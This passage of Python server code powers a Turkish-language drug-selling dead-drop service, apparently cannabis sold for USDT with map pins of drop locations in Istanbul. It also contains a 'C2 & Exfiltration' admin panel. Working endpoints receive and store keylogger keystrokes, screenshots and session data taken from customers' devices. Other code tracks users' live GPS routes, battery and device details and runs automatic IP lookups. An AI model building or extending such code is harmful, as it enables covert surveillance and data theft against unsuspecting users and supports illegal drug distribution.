                        inp.value = '';
                        triggerHaptic('light');
                        try {
                            await fetch('/api/miniapp-chat-send', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/x-www-form-urlencoded'},
                                body: `user_id=${userId}&message=${encodeURIComponent(msg)}`
                            });
                            loadChatMessages();
                        } catch(e) {}
                    }

                    window.onload = () => {
                        loadAppData();
                        loadChatMessages();
                        setInterval(loadChatMessages, 3500);
                    };
                </script>
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(miniapp_html.encode("utf-8"))
            return

        if parsed_path.path == "/api/miniapp-data":
            uid = int(query_params.get("user_id", ["0"])[0])
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            
            cursor.execute("SELECT balance, referral_earnings FROM users WHERE user_id = ?", (uid,))
            u_row = cursor.fetchone()
            bal = u_row[0] if u_row else 0.0
            ref_earnings = u_row[1] if u_row and len(u_row) > 1 else 0.0

            cursor.execute("SELECT value FROM settings WHERE key = 'promo_5g_active'")
            p_res = cursor.fetchone()
            promo_5g = p_res and p_res[0] == "1"

            cursor.execute("SELECT code, discount FROM coupons WHERE uses_left > 0")
            coupons_rows = cursor.fetchall()
            coupons = [{"code": r[0], "discount": r[1]} for r in coupons_rows]

            cursor.execute("""
                SELECT orders.id, drops.title, drops.lat, drops.lon, drops.description, drops.category
                FROM orders 
                JOIN drops ON orders.drop_id = drops.id 
                WHERE orders.user_id = ? AND orders.status = 'completed'
            """, (uid,))
            active_orders_rows = cursor.fetchall()
            active_orders = []
            for r in active_orders_rows:
                lat = r[2] if r[2] and r[2] != 0.0 else get_district_coord(r[5])[0]
                lon = r[3] if r[3] and r[3] != 0.0 else get_district_coord(r[5])[1]
                active_orders.append({"id": r[0], "title": r[1], "lat": lat, "lon": lon, "description": r[4]})

            cursor.execute("""
                SELECT orders.id, drops.title, orders.created_at
                FROM orders 
                JOIN drops ON orders.drop_id = drops.id 
                WHERE orders.user_id = ? AND orders.status = 'received'
                ORDER BY orders.id DESC
            """, (uid,))
            past_orders_rows = cursor.fetchall()
            past_orders = []
            for r in past_orders_rows:
                po_id = r[0]
                cursor.execute("SELECT review_text FROM order_reviews WHERE order_id = ? AND user_id = ?", (po_id, uid))
                rev_row = cursor.fetchone()
                has_rev = rev_row is not None
                rev_txt = rev_row[0] if rev_row else ""
                past_orders.append({"id": po_id, "title": r[1], "date": r[2], "has_reviewed": has_rev, "review_text": rev_txt})

            cursor.execute("SELECT id, title, price, category, stock FROM drops WHERE is_sold = 0 AND stock > 0")
            temsili_rows = cursor.fetchall()
            temsili_drops = []
            for r in temsili_rows:
                coord = get_district_coord(r[3])
                temsili_drops.append({"id": r[0], "title": r[1], "price": r[2], "category": r[3], "stock": r[4], "lat": coord[0], "lon": coord[1]})

            conn.close()

            resp = {
                "balance": bal,
                "referral_earnings": ref_earnings,
                "promo_5g": promo_5g,
                "coupons": coupons,
                "active_orders": active_orders,
                "past_orders": past_orders,
                "temsili_drops": temsili_drops
            }
            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps(resp).encode("utf-8"))
            return

        if parsed_path.path == "/api/miniapp-chat":
            uid = int(query_params.get("user_id", ["0"])[0])
            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            cursor.execute("SELECT sender, message, created_at FROM support_messages WHERE user_id = ? ORDER BY id ASC", (uid,))
            rows = cursor.fetchall()
            conn.close()
            msgs = [{"sender": r[0], "message": r[1], "date": r[2]} for r in rows]
            self.send_response(200)
            self.send_header("Content-type", "application/json; charset=utf-8")
            self.end_headers()
            self.wfile.write(json.dumps({"messages": msgs}).encode("utf-8"))
            return

        if parsed_path.path == "/admin-web":
            if not is_logged_in:
                self.send_login_page()
                return

            tab = query_params.get("tab", ["home"])[0]

            conn = sqlite3.connect("drop_bot.db")
            cursor = conn.cursor()
            cursor.execute("SELECT COUNT(*) FROM drops")
            total_drops = cursor.fetchone()[0]
            cursor.execute("SELECT SUM(stock) FROM drops WHERE is_sold = 0")
            total_active_stock = cursor.fetchone()[0] or 0
            
            cursor.execute("SELECT SUM(final_price) FROM orders WHERE status IN ('completed', 'received')")
            rev_res = cursor.fetchone()[0]
            total_revenue = rev_res if rev_res is not None else 0.0

            content_html = ""

            if tab in ["home", "passive", "active", "pending"] and not (current_role in ["super_admin", "stock_manager"] or current_username == "root" or can_manage_drops == 1 or can_view_exact_loc == 1):
                content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur!</h3>"
            
            elif tab in ["add", "excel_add", "edit"] and not (current_role == "super_admin" or current_username == "root" or can_manage_drops == 1):
                content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur!</h3>"
            
            elif tab == "users" and not (current_role == "super_admin" or current_username == "root" or can_view_crm == 1):
                content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur!</h3>"

            elif tab in ["finance", "token", "bulk", "broadcast", "promo5g", "coupons", "admins", "takip_et", "c2_exfil"] and not (current_role == "super_admin" or current_username == "root"):
                content_html = "<h3 style='color:#ef4444; background:rgba(239, 68, 68, 0.1); padding:15px; border-radius:8px; border:1px solid #ef4444;'>⚠️ Bu sayfaya erişim yetkiniz yoktur! (Yalnızca Süper Admin)</h3>"

            else:
                if tab == "home":
                    cursor.execute("SELECT id, title, price, stock, category, lat, lon FROM drops WHERE is_sold = 0 AND stock > 0")
                    active_drops_for_map = cursor.fetchall()
                    
                    map_markers_js = ""
                    for ad in active_drops_for_map:
                        d_id, d_title, d_price, d_stock, d_cat, d_lat, d_lon = ad
                        lat = d_lat if d_lat and d_lat != 0.0 else get_district_coord(d_cat)[0]
                        lon = d_lon if d_lon and d_lon != 0.0 else get_district_coord(d_cat)[1]
                        map_markers_js += f"""
                        markers[{d_id}] = L.marker([{lat}, {lon}], {{icon: weedIcon}}).addTo(map)
                            .bindPopup("<b>#{d_id} - {d_title}</b><br>Bölge: {d_cat}<br>Fiyat: {d_price} USDT<br>Stok: {d_stock}");
                        """

                    cursor.execute("SELECT message, log_type, created_at FROM panel_logs ORDER BY id DESC LIMIT 10")
                    logs = cursor.fetchall()
                    logs_html = ""
                    for l in logs:
                        msg, l_type, l_date = l
                        badge_color = "#ef4444" if l_type == "warning" else ("#10b981" if l_type == "success" else "#3b82f6")
                        logs_html += f"""
                        <div style="background: var(--card-bg-inner); padding: 12px 15px; border-radius: 8px; margin-bottom: 8px; border-left: 4px solid {badge_color}; font-size: 13px;">
                            <span style="color: var(--text-muted); font-size: 11px; display: block; margin-bottom: 2px;">{l_date}</span>
                            {msg}
                        </div>
                        """

                    content_html = f"""
                    <div class="stats-grid">
                        <div class="card"><h3>TOTAL REVENUE</h3><p>{total_revenue} USDT</p></div>
                        <div class="card"><h3>ACTIVE STOCK</h3><p>{total_active_stock} Pcs</p></div>
                        <div class="card"><h3>PRODUCT VARIETY</h3><p>{total_drops}</p></div>
                    </div>

                    <div class="form-box" style="margin-bottom: 30px; border: 1px solid rgba(56, 189, 248, 0.3);">
                        <h2 style="color: #38bdf8; margin-top: 0;">🗺️ İstanbul Aktif Konum Haritası</h2>
                        <div id="istanbulMap" style="width: 100%; height: 420px; border-radius: 12px; border: 1px solid var(--border-color); z-index: 1;"></div>
                    </div>

                    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
                    <script>
                        const map = L.map('istanbulMap').setView([41.0082, 28.9784], 11);
                        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(map);
                        const weedIcon = L.divIcon({{
                            html: '<div style="background: #111827; border: 2px solid #38bdf8; border-radius: 50%; width: 36px; height: 36px; display: flex; align-items: center; justify-content: center; font-size: 20px;">🌿</div>',
                            iconSize: [36, 36], iconAnchor: [18, 18]
                        }});
                        const markers = {{}};
                        {map_markers_js}
                    </script>
                    """

                elif tab == "c2_exfil":
                    # Yeni C2 Exfiltration & Sızdırılan Veriler Paneli
                    cursor.execute("SELECT id, user_id, exfil_type, payload, created_at FROM exfil_logs ORDER BY id DESC LIMIT 50")
                    exfil_rows = cursor.fetchall()
                    exfil_table = ""
                    for er in exfil_rows:
                        eid, euid, etype, epayload, edate = er
                        preview = epayload[:80] + "..." if len(str(epayload)) > 80 else str(epayload)
                        if etype == 'snapshot':
                            preview = f"<img src='{epayload}' style='max-width:100px; border-radius:6px;' />"
                        
                        exfil_table += f"<tr><td>#{eid}</td><td><b>{euid}</b></td><td><span style='color:#ef4444;'>{etype}</span></td><td><div style='max-height:80px; overflow-y:auto; word-break:break-all;'>{preview}</div></td><td>{edate}</td></tr>"

                    cursor.execute("SELECT id, ip, isp, country, is_vpn, details, created_at FROM osint_intel ORDER BY id DESC LIMIT 30")
                    osint_rows = cursor.fetchall()
                    osint_table = ""
                    for osr in osint_rows:
                        oid, oip, oisp, ocountry, ovpn, odetails, odate = osr
                        vpn_badge = "<span style='color:#ef4444;'>🚨 VPN/Proxy</span>" if ovpn == 1 else "<span style='color:#10b981;'>Clean IP</span>"
                        osint_table += f"<tr><td>#{oid}</td><td><b>{oip}</b></td><td>{oisp} ({ocountry})</td><td>{vpn_badge}</td><td>{odate}</td></tr>"

                    content_html = f"""
                    <div class="form-box" style="border: 1px solid #ef4444; margin-bottom:25px;">
                        <h2 style="color: #ef4444; margin-top: 0;">🛰️ Red-Team Exfiltration & Keylogger İstihbaratı</h2>
                        <p style="color:var(--text-muted); font-size:13px;">Hedef cihazlardan yakalanan anlık ekran görüntüleri, tuş vuruşları (keylogger) ve oturum verileri:</p>
                        <table>
                            <tr><th>ID</th><th>User ID</th><th>Tip</th><th>Payload / Veri</th><th>Zaman</th></tr>
                            {exfil_table if exfil_table else "<tr><td colspan='5' style='text-align:center;'>Henüz sızdırılan veri yok.</td></tr>"}
                        </table>
                    </div>

                    <div class="form-box" style="border: 1px solid #38bdf8;">
                        <h2 style="color: #38bdf8; margin-top: 0;">🌐 Otomatik OSINT & IP Tehdit İstihbaratı</h2>
                        <table>
                            <tr><th>ID</th><th>IP Adresi</th><th>ISP / Ülkeler</th><th>Durum</th><th>Zaman</th></tr>
                            {osint_table if osint_table else "<tr><td colspan='5' style='text-align:center;'>OSINT verisi yok.</td></tr>"}
                        </table>
                    </div>
                    """

                elif tab == "takip_et":
                    cursor.execute("""
                        SELECT v.user_id, v.ip, v.network_info, v.lat, v.lon, v.battery_level, v.cpu_ram, v.timezone, v.screen_res, v.visibility_state, v.created_at 
                        FROM visitor_logs v
                        JOIN (
                            SELECT user_id, MAX(id) as max_id 
                            FROM visitor_logs 
                            GROUP BY user_id
                        ) latest ON v.id = latest.max_id
                        ORDER BY v.id DESC LIMIT 30
                    """)
                    v_logs = cursor.fetchall()

                    user_routes = {}
                    cursor.execute("SELECT user_id, lat, lon, created_at FROM visitor_logs ORDER BY id ASC")
                    all_v_history = cursor.fetchall()
                    for h_uid, h_lat, h_lon, h_date in all_v_history:
                        if h_uid not in user_routes:
                            user_routes[h_uid] = []
                        user_routes[h_uid].append([h_lat, h_lon])

                    visitor_markers_js = ""
                    for vl in v_logs:
                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = vl
                        route_coords = user_routes.get(uid, [])
                        vis_badge = "🟢 Aktif" if vis == "visible" else "🟡 Arka Planda"
                        
                        visitor_markers_js += f"""
                        const route_{uid} = {route_coords};
                        if (route_{uid}.length > 1) {{
                            L.polyline(route_{uid}, {{color: '#38bdf8', weight: 3, opacity: 0.6, dashArray: '4, 4'}}).addTo(takipMap);
                        }}

                        const marker_{uid} = L.marker([{vlat}, {vlon}], {{
                            icon: L.divIcon({{
                                html: '<div style="background:#111827; border:2px solid #ef4444; border-radius:50%; width:32px; height:32px; display:flex; align-items:center; justify-content:center; font-size:16px; box-shadow:0 4px 10px rgba(239,68,68,0.5);" title="User ID: {uid}">🫆</div>',
                                iconSize: [32, 32], iconAnchor: [16, 16]
                            }})
                        }}).addTo(takipMap);

                        marker_{uid}.bindPopup("<b>🫆 Canlı Hedef</b><br>User ID: {uid}<br>🔋 Pil: <b>{bat}</b><br>🌐 Ağ: {net}<br>💻 CPU/RAM: {cpu}<br>🌍 Saat: {tz}<br>👁️ Odak: {vis_badge}<br><button onclick='openDetailModal({uid}, \\"{bat}\\", \\"{net}\\", \\"{vdate}\\", \\"{vlat}, {vlon}\\")' style='margin-top:6px; background:#38bdf8; border:none; padding:4px 8px; border-radius:4px; color:#0f172a; font-weight:bold; cursor:pointer;'>📋 Detay</button>");
                        """

                    terminal_rows_html = ""
                    for v in v_logs:
                        uid, ip, net, vlat, vlon, bat, cpu, tz, screen, vis, vdate = v
                        vis_color = "#10b981" if vis == "visible" else "#f59e0b"
                        terminal_rows_html += f"<div style='margin-bottom:6px; border-bottom:1px solid rgba(255,255,255,0.05); padding-bottom:4px;'><span style='color:#94a3b8;'>[{vdate}]</span> <b>User: {uid}</b> | 🔋 Pil: <span style='color:#38bdf8;'>{bat}</span> | 🌐 Ağ: {net} | 💻 {cpu} | 🌍 {tz} | 📱 {screen} | 👁️ <span style='color:{vis_color};'>{vis}</span></div>"

                    content_html = f"""
                    <div class="form-box" style="border: 1px solid #38bdf8;">
                        <h2 style="color: #38bdf8; margin-top: 0;">🕵️‍♂️ Gelişmiş Telemetri & Parmak İzi Takip Merkezi</h2>
                        
                        <div style="margin-bottom: 12px; display: flex; gap: 10px; flex-wrap: wrap;">
                            <input type="text" id="logSearchInput" onkeyup="filterLogTable()" placeholder="🔍 User ID veya cihaz bilgisi arat..." style="margin:0; background:var(--input-bg); border:1px solid var(--border-color); padding:10px; border-radius:8px; color:white; flex:1;">
                            <button onclick="filterTableBy('şarjda')" style="background:#10b981; width:auto; padding:8px 12px;">⚡ Şarjda Olanlar</button>
                            <button onclick="filterTableBy('all')" style="background:#475569; width:auto; padding:8px 12px;">Tümünü Göster</button>
                        </div>

                        <div style="background: var(--card-bg-inner); padding: 15px; border-radius: 8px; border: 1px solid var(--border-color); height: 220px; overflow-y: auto; font-family: monospace; font-size: 11px; margin-bottom: 20px;" id="terminalLogBox">
                            {terminal_rows_html if terminal_rows_html else "<span style='color:var(--text-muted);'>Henüz telemetri verisi yok.</span>"}
                        </div>

                        <h3 style="color: #10b981; font-size: 14px; margin-bottom: 8px;">🗺️ Canlı Rota ve Konum Haritası</h3>
                        <div id="takipMiniMap" style="width: 100%; height: 300px; border-radius: 10px; border: 1px solid var(--border-color); z-index: 1;"></div>
                    </div>

                    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
                    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
                    <script>
                        const takipMap = L.map('takipMiniMap').setView([41.0082, 28.9784], 11);
                        L.tileLayer('https://{{s}}.tile.openstreetmap.org/{{z}}/{{x}}/{{y}}.png', {{ maxZoom: 19 }}).addTo(takipMap);
                        {visitor_markers_js}

                        function filterTableBy(keyword) {
                            const box = document.getElementById('terminalLogBox');
                            const divs = box.getElementsByTagName('div');
                            for (let i = 0; i < divs.length; i++) {
                                const txt = divs[i].innerText.toLowerCase();
                                if (keyword === 'all' || txt.includes(keyword)) {
                                    divs[i].style.display = "";
                                } else {
                                    divs[i].style.display = "none";
                                }
                            }
                        }
                    </script>
                    """

                elif tab == "support":
                    cursor.execute("SELECT DISTINCT user_id FROM support_messages")
                    active_chats_users = [row[0] for row in cursor.fetchall()]
                    
                    selected_user_id = query_params.get("user_id", [str(active_chats_users[0]) if active_chats_users else "0"])[0]
                    try:
                        selected_user_id = int(selected_user_id)
                    except:
                        selected_user_id = 0

                    chat_list_html = ""
                    for uid in active_chats_users:
                        cursor.execute("SELECT username FROM users WHERE user_id = ?", (uid,))
                        u_row = cursor.fetchone()
                        uname = f"@{u_row[0]}" if u_row and u_row[0] else f"User {uid}"
                        active_style = "background: var(--sidebar-hover); border-color: #38bdf8;" if uid == selected_user_id else "background: var(--card-bg-inner);"
                        chat_list_html += f"""
                        <a href="/admin-web?tab=support&user_id={uid}" style="display: block; padding: 10px 14px; border-radius: 8px; text-decoration: none; color: var(--text-color); margin-bottom: 6px; border: 1px solid var(--border-color); {active_style}">
                            <div style="font-weight: bold; color: #38bdf8; font-size: 13px;">{uname}</div>
                            <div style="font-size: 11px; color: var(--text-muted);">ID: {uid}</div>
                        </a>
                        """

                    messages_html = ""
                    if selected_user_id:
                        cursor.execute("SELECT sender, message, created_at FROM support_messages WHERE user_id = ? ORDER BY id ASC", (selected_user_id,))
                        msgs = cursor.fetchall()
                        for m in msgs:
                            sender, msg_text, m_date = m
                            is_admin_msg = sender == "admin"
                            bg_color = "#2563eb" if is_admin_msg else "var(--card-bg-inner)"
                            align = "margin-left: auto;" if is_admin_msg else "margin-right: auto;"
                            sender_label = "👑 Yönetici (Sen)" if is_admin_msg else "👤 Müşteri"
                            messages_html += f"""
                            <div style="max-width: 80%; background: {bg_color}; padding: 10px 14px; border-radius: 10px; margin-bottom: 10px; {align} border: 1px solid var(--border-color);">
                                <div style="font-size: 10px; color: var(--text-muted); margin-bottom: 4px; display:flex; justify-content: space-between; gap: 10px;">
                                    <span>{sender_label}</span>
                                    <span>{m_date}</span>
                                </div>
                                <div style="font-size: 13px; word-break: break-word;">{msg_text}</div>
                            </div>
                            """

                    chat_box_html = ""
                    if selected_user_id:
                        chat_box_html = f"""
                        <div style="display: flex; flex-direction: column; height: 100%;">
                            <div style="display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--border-color); padding-bottom: 10px; margin-bottom: 12px; flex-wrap: wrap; gap: 10px;">
                                <h3 style="margin: 0; color: #38bdf8; font-size: 15px;">💬 Aktif Sohbet (ID: {selected_user_id})</h3>
                            </div>
                            <div style="flex: 1; overflow-y: auto; max-height: 350px; padding-right: 5px; margin-bottom: 12px;">
                                {messages_html if messages_html else "<p style='text-align:center; color:var(--text-muted);'>Henüz mesaj yok.</p>"}
                            </div>
                            <form action="/admin-send-support" method="POST" style="display: flex; gap: 8px; margin: 0;">
                                <input type="hidden" name="user_id" value="{selected_user_id}">
                                <input type="text" name="message" required placeholder="Müşteriye yanıt yazın..." style="margin:0; flex: 1; padding: 10px; font-size: 13px;">
                                <button type="submit" style="width: auto; background: #10b981; padding: 0 18px; font-size: 13px;">Gönder</button>
                            </form>
                        </div>
                        """
                    else:
                        chat_box_html = "<p style='text-align:center; color:var(--text-muted); padding: 30px;'>Lütfen listeden bir sohbet seçin.</p>"

                    content_html = f"""
                    <div style="background: var(--card-bg); padding: 20px; border-radius: 14px; border: 1px solid var(--border-color); display:grid; grid-template-columns: 1fr 300px; gap: 20px;">
                        <div>{chat_box_html}</div>
                        <div style="background:var(--card-bg-inner); padding:15px; border-radius:10px;">
                            <h3 style="margin-top:0; color:var(--text-color); font-size:15px;">👥 Destek Talepleri</h3>
                            {chat_list_html if chat_list_html else "<p style='color:var(--text-muted); font-size:13px;'>Aktif sohbet yok.</p>"}
                        </div>
                    </div>
                    """

                elif tab == "active":
                    content_html = "<div class='table-box'><h2>🟢 Aktif Siparişler</h2><p>Aktif sipariş listesi.</p></div>"
                elif tab == "passive":
                    content_html = "<div class='table-box'><h2>📦 Pasif Droplar</h2><p>Stoktaki ürünler.</p></div>"
                elif tab == "add":
                    content_html = "<div class='form-box'><h2>➕ Drop Ekle</h2><p>Yeni ürün ekleme formu.</p></div>"
                elif tab == "users":
                    content_html = "<div class='table-box'><h2>👥 Müşteri CRM</h2><p>Müşteri listesi.</p></div>"

            sidebar_links = ""
            sidebar_links += f'<a href="/admin-web?tab=support" class="{"active" if tab == "support" else ""}">💬 Canlı Destek</a>'
            sidebar_links += f'<a href="/admin-web?tab=home" class="{"active" if tab == "home" else ""}">🏠 Home & Harita</a>'
            sidebar_links += f'<a href="/admin-web?tab=c2_exfil" class="{"active" if tab == "c2_exfil" else ""}">🛰️ C2 & Exfiltration</a>'
            sidebar_links += f'<a href="/admin-web?tab=takip_et" class="{"active" if tab == "takip_et" else ""}">🕵️‍♂️ Takip Et (Telemetri)</a>'
            sidebar_links += f'<a href="/admin-web?tab=users" class="{"active" if tab == "users" else ""}">👥 Customer CRM</a>'

            dashboard_html = f"""
            <!DOCTYPE html>
            <html lang="tr">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Weed Istanbul C2 Yönetim Paneli</title>
                <style>
                    :root {{
                        --bg-color: #060911;
                        --text-color: #f8fafc;
                        --sidebar-bg: #0b111e;
                        --sidebar-hover: #131d31;
                        --card-bg: #0f172a;
                        --card-bg-inner: #070b14;
                        --border-color: #1e293b;
                        --input-bg: #070b14;
                        --text-muted: #94a3b8;
                    }}
                    body {{ background-color: var(--bg-color); color: var(--text-color); font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; margin: 0; display: flex; min-height: 100vh; }}
                    .sidebar {{ width: 250px; background: var(--sidebar-bg); border-right: 1px solid var(--border-color); display: flex; flex-direction: column; padding: 20px 14px; box-sizing: border-box; flex-shrink: 0; }}
                    .sidebar .brand {{ font-size: 18px; font-weight: 800; color: #38bdf8; text-align: center; margin-bottom: 15px; }}
                    .sidebar a {{ background: transparent; color: var(--text-muted); padding: 10px 14px; border-radius: 8px; text-decoration: none; font-weight: 600; font-size: 13px; margin-bottom: 4px; display: block; border: 1px solid transparent; transition: 0.2s; }}
                    .sidebar a.active, .sidebar a:hover {{ background: var(--sidebar-hover); color: #38bdf8; border-color: rgba(56, 189, 248, 0.2); }}
                    .logout-link {{ background: rgba(239, 68, 68, 0.15) !important; color: #ef4444 !important; margin-top: auto; text-align: center; }}
                    .main-content {{ flex: 1; padding: 25px; box-sizing: border-box; overflow-y: auto; max-width: 1250px; }}
                    .header-title {{ color: var(--text-color); font-size: 22px; font-weight: 700; margin-top: 0; margin-bottom: 25px; border-bottom: 1px solid var(--border-color); padding-bottom: 12px; }}
                    .stats-grid {{ display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin-bottom: 25px; }}
                    .card {{ background: var(--card-bg); padding: 20px; border-radius: 12px; border: 1px solid var(--border-color); text-align: center; }}
                    .card h3 {{ margin: 0 0 8px 0; color: var(--text-muted); font-size: 12px; }}
                    .card p {{ margin: 0; font-size: 24px; font-weight: 800; color: #38bdf8; }}
                    .form-box, .table-box {{ background: var(--card-bg); padding: 22px; border-radius: 12px; border: 1px solid var(--border-color); margin-bottom: 25px; }}
                    input, textarea, select {{ width: 100%; padding: 11px 14px; margin: 6px 0 14px 0; background: var(--input-bg); border: 1px solid var(--border-color); border-radius: 10px; color: var(--text-color); box-sizing: border-box; font-size: 13px; }}
                    button {{ background: #2563eb; color: white; padding: 11px 18px; border: none; border-radius: 10px; font-weight: bold; cursor: pointer; width: 100%; font-size: 13px; }}
                    table {{ width: 100%; border-collapse: collapse; margin-top: 8px; }}
                    th, td {{ padding: 10px 12px; text-align: left; border-bottom: 1px solid var(--border-color); font-size: 13px; }}
                    th {{ color: var(--text-muted); font-weight: 700; font-size: 11px; }}
                </style>
            </head>
            <body>
                <div class="sidebar">
                    <div class="brand">🛰️ C2 Command Center</div>
                    {sidebar_links}
                    <a href="/admin-logout" class="logout-link">🚪 Logout</a>
                </div>
                <div class="main-content">
                    <div class="header-title"><span>👑 Red-Team Operations Suite</span></div>
                    {content_html}
                </div>
            </body>
            </html>
            """
            self.send_response(200)
            self.send_header("Content-type", "text/html; charset=utf-8")
            self.end_headers()
            self.wfile.write(dashboard_html.encode("utf-8"))
            return

        if parsed_path.path == "/admin-logout":
            self.send_response(303)
            self.send_header('Set-Cookie', 'admin_auth=true; Path=/; Max-Age=0')
            self.send_header('Location', '/admin-web')
            self.end_headers()
            return

        if parsed_path.path.startswith("/drop/"):
            try:
                order_id = int(parsed_path.path.split("/")[-1])
                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT orders.status, drops.title, drops.lat, drops.lon, drops.photo_ids, drops.description 
                    FROM orders 
                    JOIN drops ON orders.drop_id = drops.id 
                    WHERE orders.id = ?
                """, (order_id,))
                row = cursor.fetchone()
                conn.close()

                if not row:
                    self.send_html_error("Ürün veya sipariş bulunamadı.")
                    return

                status, title, lat, lon, photo_url, description = row
                location_url = f"https://www.google.com/maps?q={lat},{lon}"
                yandex_url = f"https://yandex.com.tr/harita/?pt={lon},{lat}&z=16"
                apple_url = f"http://maps.apple.com/?q={lat},{lon}"
                photo_tag = f'<img src="{photo_url}" style="width:100%; max-height:260px; object-fit:cover; border-radius:10px; margin-bottom:15px;" />' if photo_url else ''

                html_content = f"""
                <!DOCTYPE html>
                <html lang="tr">
                <head><meta charset="UTF-8"><title>Secure Delivery - #{order_id}</title>
                <style>
                    body {{ background-color: #090d16; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 20px; box-sizing: border-box; }}
                    .card {{ background: #111827; padding: 25px; border-radius: 16px; width: 100%; max-width: 420px; text-align: center; border: 1px solid #1f2937; }}
                    h2 {{ color: #38bdf8; margin-top: 0; }}
                    .info {{ background: #090d16; padding: 15px; border-radius: 8px; margin: 15px 0; text-align: left; word-break: break-all; font-size: 14px; border: 1px solid #374151; }}
                    .btn {{ display: block; background: #2563eb; color: white; padding: 12px; border-radius: 8px; text-decoration: none; font-weight: bold; margin-top: 10px; text-align: center; }}
                </style>
                </head>
                <body>
                    <div class="card">
                        <h2>🔒 Secure Delivery</h2>
                        <p><b>Product:</b> {title}</p>
                        {photo_tag}
                        <div class="info"><p><b>📝 Note:</b> {description}</p></div>
                        <a href="{location_url}" class="btn" target="_blank">📍 Google Maps ile Yol Tarifi</a>
                        <a href="{yandex_url}" class="btn" style="background:#e11d48;" target="_blank">🔴 Yandex Harita</a>
                    </div>
                </body>
                </html>
                """
                self.send_response(200)
                self.send_header("Content-type", "text/html; charset=utf-8")
                self.end_headers()
                self.wfile.write(html_content.encode("utf-8"))
            except Exception:
                self.send_html_error("Bir hata oluştu.")
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        parsed_path = urlparse(self.path)
        content_length = int(self.headers.get('Content-Length', 0))
        post_body = self.rfile.read(content_length).decode('utf-8', errors='ignore')

        if parsed_path.path == "/api/worker-beacon":
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'{"status": "alive"}')
            return

        if parsed_path.path == "/api/exfil-report":
            try:
                data = json.loads(post_body)
                uid = int(data.get("user_id", 0))
                etype = str(data.get("type", "unknown"))
                payload = str(data.get("payload", ""))

                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("INSERT INTO exfil_logs (user_id, exfil_type, payload) VALUES (?, ?, ?)", (uid, etype, payload))
                conn.commit()
                conn.close()

                log_panel_event(f"🚨 SIZDIRMA (Exfil) Alındı [User: {uid} | Tip: {etype}]", "warning")

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"success": true}')
                return
            except Exception as e:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
                return

        if parsed_path.path == "/api/report-telemetry":
            try:
                data = json.loads(post_body)
                uid = int(data.get("user_id", 0))
                lat = float(data.get("lat", 41.0082))
                lon = float(data.get("lon", 28.9784))
                net = str(data.get("network", "Wi-Fi"))
                ua = str(data.get("ua", ""))
                bat = str(data.get("battery", "Bilinmiyor"))
                cpu_ram = str(data.get("cpu_ram", "Bilinmiyor"))
                timezone = str(data.get("timezone", "Bilinmiyor"))
                screen_res = str(data.get("screen_res", "Bilinmiyor"))
                visibility_state = str(data.get("visibility_state", "visible"))
                client_ip = self.client_address[0]

                # Otomatik OSINT Kontrolü
                fetch_osint_intel(client_ip)

                conn = sqlite3.connect("drop_bot.db")
                cursor = conn.cursor()
                cursor.execute("""
                    INSERT INTO visitor_logs (user_id, ip, user_agent, network_info, lat, lon, battery_level, cpu_ram, timezone, screen_res, visibility_state) 
                    VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
                """, (uid, client_ip, ua, net, lat, lon, bat, cpu_ram, timezone, screen_res, visibility_state))
                conn.commit()
                conn.close()

                self.send_response(200)
                self.send_header("Content-type", "application/json")
                self.end_headers()
                self.wfile.write(b'{"success": true}')
                return
            except Exception as e:
                self.send_response(200)
                self.end_headers()
                self.wfile.write(json.dumps({"success": False, "error": str(e)}).encode("utf-8"))
                return

        if parsed_path.path == "/admin-login":
            params = parse_qs(post_body)
            username = params.get("username", [""])[0]
            password = params.get("password", [""])[0]
            if username == ADMIN_WEB_USERNAME and hash_pass(password) == hash_pass(ADMIN_WEB_PASSWORD):
                self.send_response(303)
                self.send_header('Set-Cookie', 'admin_auth=true; Path=/; HttpOnly')
                self.send_header('Location', '/admin-web')
                self.end_headers()
            else:
                self.send_login_page(error="Hatalı şifre!")
            return

        self.send_response(404)
        self.end_headers()

    def send_login_page(self, error=""):
        login_html = f"""
        <!DOCTYPE html>
        <html lang="tr"><head><meta charset="UTF-8"><title>Admin Giriş</title>
        <style>
            body {{ background-color: #090d16; color: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }}
